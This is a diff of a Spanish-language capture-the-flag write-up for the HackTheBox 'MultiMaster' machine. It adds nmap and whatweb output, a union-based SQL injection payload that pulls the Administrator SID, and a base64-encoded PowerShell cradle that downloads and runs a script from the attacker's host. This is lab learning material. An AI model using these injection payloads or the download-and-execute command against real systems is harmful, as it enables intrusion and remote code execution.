@@ -1,5 +1,5 @@
 -------
-- Tags:
+- Tags: #sqlite-injection #waf #python-scripting #password-crack #SQLi-DC #SID-RID #smb #rpcclient #rpc #Visual-Studio-Code #AMSI-Bypass #genericWrite-privilege #bloodhound #ASREPRoast #Server-Operators-Group #binpath
 ---------
 ## Técnicas utilizadas
 - SQLI (SQL Injection) - Unicode Injection  
@@ -33,10 +33,58 @@
 ---------
 #### Reconocimiento
 El escaneo con **nmap** nos muestra los siguientes puertos abiertos:
+```ruby
+# nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49701 10.10.10.179 -oN Ports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 15:28 MST
+Nmap scan report for 10.10.10.179
+Host is up (0.13s latency).
 
-
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: MegaCorp
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 22:31:15Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2023-06-25T22:32:48+00:00; +2m54s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|   Product_Version: 10.0.14393
+|_  System_Time: 2023-06-25T22:32:08+00:00
+| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+| Not valid before: 2023-06-24T22:27:47
+|_Not valid after:  2023-12-24T22:27:47
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+```
 Si lanzamos un **whatweb** podemos ver las tecnologías que corren por detrás del sitio web:
-
+```ruby
+# whatweb 10.10.10.179
+http://10.10.10.179 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.179], Microsoft-IIS[10.0], Script, Title[MegaCorp], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge]
+```
 Podemos crear un diccionario con los usuarios encontrados en el apartado de *Colleage Finder* para intentar un **asreproast attack**, contemplamos el *dominio* de los correos en el */etc/hosts* y ejecutamos el comando:
 
 ```
@@ -162,6 +210,16 @@ Podemos listar informacion de usuarios del directivo activo, en este caso listar
 
 Esto nos mostrara el resultado, pero en formato **unicode**, el mismo que estamos utilizando para hacer la inyección **SQL**:
 ```
+> test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
+[
+    {
+        "id": 1,
+        "name": "\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000\u00d1\u00bc\u00d1\u0081\u00f1I+\u00df\u00c26\u00f4\u0001\u0000\u0000",
+        "position": "3",
+        "email": "4",
+        "src": "5"
+    }
+]
 ```
 
 ---------
@@ -169,7 +227,7 @@ Esto nos mostrara el resultado, pero en formato **unicode**, el mismo que estamo
 
 Podemos convertir el formato **unicode** a hexadeciaml de la siguiente forma:
 ```
-> test' union select 1,(select sys.fn_varbintohexstr(SUSER_PID('MEGACORP\Administrator'))),3,4,5-- -
+> 		test' union select 1,(select sys.fn_varbintohexstr(SUSER_PID('MEGACORP\Administrator'))),3,4,5-- -
 ```
 
 Esto nos da como resultado una mezcla del **SID** y el **RID**. Los primeros 48 caracteres pertenecen al **SID**, los caracteres restandes pertenecen al **RID**. Vamos a separar los ultimos caracteres de dos en dos y borrar los *0* que este acompañados de otro *0*. Una vez hecho esto, le tenemos que dar la vuelta a la cadena restante. Un ejemplo de como seria:
@@ -310,7 +368,7 @@ Podemos ahorrarnos el proceso de arriba. **Evil-winrm** cuenta con un **menu**, 
 
 A la hora de intentar colar el comando con **cefdebug**, veremos que tenemos el problema con las dobles comillas y las comillas simples. Lo que podemos hacer es convertir todo el comando integro a **base64**, cabe mencionar que para que esto funcione en **Windows** tenemos que hacerlo de esta manera:
 ```
-# echo -n "IEX(New-Object New.WebClient).downloadString('http://10.10.14.181/Ps.ps1')" | iconv -t utf-16le | base64 -w 0
+# echo -n "IEX(New-Object New.WebClient).downloadString('http://10.10.14.30/ps.ps1')" | iconv -t utf-16le | base64 -w 0
 ```
 
 Y para intrarpetarlo desde **PowerShell** tenemos que ejecutar el siguiente comando:
@@ -392,3 +450,6 @@ PS > sc.exe start browser
 ```
 
 Y ya podriamos conectarnos a la maquina victima como el usuario **Administrator** a través de **Evil-WinRm**.
+
+
+"MultiMaster" ^626d41
